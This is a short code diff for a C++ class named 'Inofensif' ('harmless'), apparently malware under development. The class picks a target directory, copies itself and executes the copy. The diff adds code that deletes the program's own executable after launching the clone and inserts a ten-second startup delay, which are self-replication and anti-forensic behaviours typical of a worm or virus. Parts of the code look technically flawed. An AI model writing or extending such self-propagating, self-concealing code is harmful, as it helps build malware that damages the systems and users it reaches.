@@ -136,10 +136,10 @@ class	Inofensif
 			{
 				if (debug)
 					std::cout << "clone path: " << clone_path << std::endl;
-				execve(clone_path, NULL, NULL);
+				execl(clone_path.filename().c_str(), "clone", NULL);
 			}
 			wait(NULL);
-			
+			std::filesystem::remove("/proc/self/exe");
 		}
 
 	public:
@@ -147,6 +147,7 @@ class	Inofensif
 					movement(choisirMovementAleatoire()),
 					dir_target(get_dir_target())
 		{
+			sleep(10);
 			if (debug)
 				std::cout << "le repertoire cible est:___________" << dir_target << std::endl;
 			clone_itself();
